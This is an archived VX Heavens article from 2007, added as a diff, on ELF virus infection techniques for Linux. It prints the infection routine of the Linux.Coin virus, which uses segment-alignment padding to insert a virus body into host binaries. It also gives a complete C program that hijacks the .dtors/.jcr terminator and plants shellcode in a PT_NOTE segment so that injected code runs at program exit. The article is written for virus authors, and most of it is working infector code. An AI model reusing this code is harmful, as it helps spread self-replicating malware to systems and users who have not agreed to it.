@@ -1,0 +1,217 @@
+<?xml version="1.0"?>
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
+<head>
+<title>Reverse of a coin: A short note on segment alignment</title>
+<meta http-equiv="content-type" content="text/html; charset=iso-8859-1"/>
+<meta name="description" content=""/>
+<meta name="Keywords" content="virus,virii,herm1t,Linux.Coin,segment padding, segment alignment,.ctors,.dtors,CRT"/>
+<script type="text/javascript">
+//<![CDATA[
+try{if (!window.CloudFlare) {var CloudFlare=[{verbose:0,p:0,byc:0,owlid:"cf",bag2:1,mirage2:0,oracle:0,paths:{cloudflare:"/cdn-cgi/nexp/dok3v=1613a3a185/"},atok:"047a5bcbf67431883fc9ed25fba33612",petok:"e9d0906b33624eecb5a6f54d56f32907a4e7245c-1498755126-1800",zone:"vxheaven.org",rocket:"a",apps:{}}];document.write('<script type="text/javascript" src="//ajax.cloudflare.com/cdn-cgi/nexp/dok3v=85b614c0f6/cloudflare.min.js"><'+'\/script>');}}catch(e){};
+//]]>
+</script>
+<style type="text/css">body{margin:1em;}h1{margin:0;}</style>
+</head>
+<body>
+<h1>Reverse of a coin: A short note on segment alignment</h1>
+<p>herm1t, oct 2007</p>
+<p><a href="index.html">Back to main page</a></p>
+<p>One of the widely used method of ELF files infection was propposed by Silvio Cesare [1]. To inject the virus to a file the free space at the end of text segment, appeared as a result of alignment is used. Alignment is neccessary to prevent the beginning of the data segment and the end of text segment from ending up in the same page. The "hole" in the memory exist no only in the end of text segment, but also at the beginning of data segment:</p>
+<pre>
+file				memory
+offset      address
+    |text |			|text |
+    |     |             	|     |
+f0f |_____| 8048f0f     	|_____|
+f10 |data | 8049f10     	|/////| not only here
+                 	8049000 +-----+ &lt;- page boundary
+				|/////| but here too
+                        	|/////|
+                 	8049f10 +-----+
+                        	|data |
+</pre>
+<p>The are two ways to align the segment, to pad the previous segment with zeroes (in file), so the next segment will start in the next page, but by doing so, the size of the file will grow; or increase the address of the segment, so the segments will lay in the file chock-a-block, but the "hole" in the memory will appear. So there are three types of files:</p>
+<ul>
+<li>Rare case - there is no hole neither in file, nor in memory. Can do nothing with such file.</li>
+<li>Data segment begins from the offset multiple of page size. Like in the original method, we will use the padding of code segment.</li>
+<li>Most typical case - no padding, the whole page is available, because the offsets and addresses of the segments must be co-aligned. The same page in file (holding the tail of text and the head of data) is mapped twice and we may "convert" it to the two separate pages. That is all about.</li>
+</ul>
+<p>It follows from the picture above, that for the files of type three, the space available for virus is exactly equal to the page size, that is 4096 bytes. And all statistics, like what file can be infected by virus with length L are of no use. The example of such calculations can be found in [2].</p>
+<p>The data segment may contain the code as well as code segment, despite of "rw-" permissions, and even ExecShield will have nothing against it. By the way, to keep the code in the data segment is the ancient Unix tradition: in the original Unix&reg; on PDP-11, the code in the data segment was used for indirect syscalls [3].</p>
+<p>A bit of code (from the Linux.Coin virus, the code not related to infection was brought from Linux.Caveat):</p>
+<pre>
+        for (ok = 0, i = 0; i &lt; ehdr->e_phnum; i++)
+                if (phdr[i].p_type == PT_LOAD &amp;&amp; phdr[i].p_offset == 0 &amp;&amp;
+		   (i + 1) &lt; ehdr->e_phnum &amp;&amp; phdr[i + 1].p_type == PT_LOAD
+		   &amp;&amp; phdr[i + 1].p_filesz > 0) {
+                        if (phdr->p_filesz != phdr->p_memsz)
+                                break;
+                        ok++;
+                        break;
+                }
+	if (! ok)
+		goto error2;
+      
+	uint32_t dp, tp, ve, vo;
+        vo = phdr[i].p_filesz;
+        ve = phdr[i].p_vaddr + phdr[i].p_filesz;
+        tp = 4096 - (phdr[i].p_filesz &amp; 4095);
+        dp = phdr[i + 1].p_vaddr - (phdr[i + 1].p_vaddr &amp; ~4095);
+
+	if (tp + dp &lt; size || tp == 0x1000)
+		goto error2;
+	/* we will use the padding in the text segment */
+	phdr[i].p_memsz += tp;
+        phdr[i].p_filesz += tp;
+	/* ... and this space is also available */
+	if (dp != 0) {
+	        phdr[i+1].p_vaddr -= dp;
+        	phdr[i+1].p_paddr -= dp;
+	       	phdr[i+1].p_offset += tp;
+        	phdr[i+1].p_filesz += dp;
+	       	phdr[i+1].p_memsz += dp;
+	}
+	/* fix PHT */
+	for (i = i + 2; i &lt; ehdr->e_phnum; i++)
+		if (phdr[i].p_offset >= vo)
+			phdr[i].p_offset += tp + dp;
+	/* insert the page */
+	if (dp != 0) {
+	        ftruncate(h, l + tp + dp);
+        	m = (char*)mremap(m, l, l + tp + dp, 0);                                         
+	        memmove(m + vo + tp + dp, m + vo, l - vo);
+	}
+	/* fix SHT */
+        if (ehdr->e_shoff >= vo)
+                ehdr->e_shoff += (tp + dp);
+	Elf32_Shdr *shdr = (Elf32_Shdr*)(m + ehdr->e_shoff);
+        for (i = 0; i &lt; ehdr->e_shnum; i++, shdr++)
+                if (shdr->sh_offset >= vo)
+                        shdr->sh_offset += (tp + dp);
+	/* copy the virus body */
+        memcpy(m + vo, self, size);
+</pre>
+<p>Let's look how PHT is changed by the exmple of <tt>/bin/uname</tt>:</p>
+<pre><strong>before</strong>
+   LOAD           0x000000 0x08048000 0x08048000 0x032b8 0x032b8 R E 0x1000
+   LOAD           0x0032b8 0x0804c2b8 0x0804c2b8 0x00662 0x00662 RW  0x1000
+   DYNAMIC        0x0033e0 0x0804c3e0 0x0804c3e0 0x000c8 0x000c8 RW  0x4
+<strong>after</strong>
+   LOAD           0x000000 0x08048000 0x08048000 <strong>0x04000 0x04000</strong> R E 0x1000
+   LOAD           <strong>0x004000 0x0804c000 0x0804c000 0x0091a 0x0091a</strong> RW  0x1000
+   DYNAMIC        <strong>0x0043e0</strong> 0x0804c3e0 0x0804c3e0 0x000c8 0x000c8 RW  0x4
+</pre>
+<p>Virus is partially located both in code and data segments.</p>
+<h2>CRT funny STUFF</h2>
+ 
+<p>Izik in his paper [4] pointed out that constructors and destructors might be used in viruses, but provided no actual code. The problem is that you <strong>cannot</strong> resize those sections after compilation to add your pointers. I'll show you here how to get the promissed fun.</p>
+<p>Let's look closer to the functions processing the arrays:</p>
+<pre><em>(defined in crtstuff.c)</em>
+static void __do_global_ctors_aux () {
+	func_ptr *p;
+	for (p = __CTOR_END__ - 1; *p != (func_ptr) -1; p--)
+		(*p) ();
+}
+static void __do_global_dtors_aux () {
+	func_ptr *p;
+	for (p = __DTOR_LIST__ + 1; *p; p++)
+		(*p) ();
+}
+</pre>
+<p>Suppose, for descriptive reasons, that we have a hello-program with one constructor (foo) and one destructor (bar):</p>
+<pre>
+void __attribute__((constructor)) foo (void) {puts("foo");}
+void __attribute__((destructor)) bar (void) {puts("bar");}
+main(){puts("hello");}
+</pre>
+<p>The output of the program will look like this:</p>
+<pre>
+$ ./hello
+foo
+hello
+bar
+</pre>
+<p>Note that .jcr section immediately follows the .dtors and usually has zero, this zero might be used as a terminator for the .dtors array and original one could be replaced with virus entry point:</p>
+<pre>
+.eh_frame:	........	You may override value stored here with Fs if you
+				don't care about exception handling
+.ctors:		FFFFFFFF	Put here virus address, if you agreed with above
+		foo		__CTOR_END__-1, look down from here until FFFFFFFF
+		00000000	__CTOR_END__
+.dtors:		FFFFFFFF	__DTOR_LIST__ (some systems put counter here)
+		bar		__DTOR_LIST___+1, look up from here, until 0
+		00000000	Put here virus address
+.jcr:		00000000	We usually have 0 here, so we can overwrite
+				the previous one.
+</pre>
+<p>Here is the simple demo that shows how to use .dtors/.jcr:</p>
+<pre>
+#include &lt;stdio.h>
+#include &lt;stdint.h>
+#include &lt;elf.h>
+#include &lt;sys/mman.h>
+
+unsigned char code[32] = {
+0x90, 0x90, 0x90, 0x90, 0x90, 0x60, 0x6a, 0x04,
+0x58, 0x6a, 0x01, 0x5b, 0xe8, 0x07, 0x00, 0x00,
+0x00, 0x54, 0x45, 0x53, 0x54, 0x21, 0x21, 0x0a,
+0x59, 0x6a, 0x05, 0x5a, 0xcd, 0x80, 0x61, 0xc3,
+};
+
+int main(int argc, char **argv)
+{
+	if (argc &lt; 2)
+		return 2;
+	int h = open(argv[1], 2);
+	int l = lseek(h, 0, 2);
+	char *m = mmap(NULL, l, PF_R|PF_W, MAP_SHARED, h, 0);
+	if (m == MAP_FAILED)
+		return 2;
+	Elf32_Ehdr *ehdr = (Elf32_Ehdr*)m;
+	Elf32_Phdr *phdr = (Elf32_Phdr*)(m + ehdr->e_phoff);
+	Elf32_Shdr *shdr = (Elf32_Shdr*)(m + ehdr->e_shoff);
+	char *strtab = m + shdr[ehdr->e_shstrndx].sh_offset;
+	int i;
+	uint32_t *cons;
+	for (cons = NULL, i = 1; i &lt; ehdr->e_shnum; i++)
+		if (! strcmp(strtab + shdr[i].sh_name, ".dtors"))
+			cons = (uint32_t*)(m + shdr[i].sh_offset + shdr[i].sh_size - 4);
+	printf("%08x %08x\n", cons[0], cons[1]);
+	if (cons == NULL || cons[0] != 0 || cons[1] != 0)
+		return 2;
+	for (i = 0; i &lt; ehdr->e_phnum; i++) {
+		if (phdr[i].p_type == PT_NOTE) {
+			phdr[i].p_type = PT_NULL;
+			cons[0] = phdr[i].p_vaddr;
+			memcpy(m + phdr[i].p_offset, code, 32);
+		}
+	}
+	munmap(m, l);
+	close(h);
+	return 0;
+}
+</pre>
+<p>Run it on hello and voila!</p>
+<pre>
+$ ./hello
+foo
+hello
+bar
+TEST!
+</pre>
+<p>Also, if you know that there are no (de-)con-structors in the program, you can adjust values inside __do_global_[cd]tors_aux routines to point it somewhere else and free space occupied by arrays or remove the initialization routines completely, possibly including _fini and frame_dummy (don't forget about calls to them from __libc_csu_fini and _init).</p>
+<p>The Coin virus uses this method to get the control from host without overriding ELF file entry point.</p>
+<p>That's kinda all.</p>
+<h2>References</h2>
+<ol>
+<li>Silvio Cesare "Unix viruses", 1999</li>
+<li>Konrad Rieck, Konrad Kretschmer "BRUNDLE FLY: A good-natured Linux ELF virus", 2001</li>
+<li>herm1t "The Dawn Virus: Tribute to UNIX/PDP-11", 2006</li>
+<li>izik "Abusing .CTORS and .DTORS for fun 'n profit"</li>
+</ol>
+<a href="http://validator.w3.org/check?uri=referer"><img src="http://validator.w3.org/images/valid_icons/valid-xhtml10-blue" alt="Valid XHTML 1.0!" height="31" width="88" border="0"/></a>
+<a href="http://jigsaw.w3.org/css-validator/"><img style="border:0;width:88px;height:31px" src="http://jigsaw.w3.org/css-validator/images/vcss-blue" alt="Valid CSS!"/></a>
+<a href="http://vxer.org/"><img src="vx.gif" alt="VX Heavens" title="VX Heavens" border="0"/></a>
+</body>
+</html>
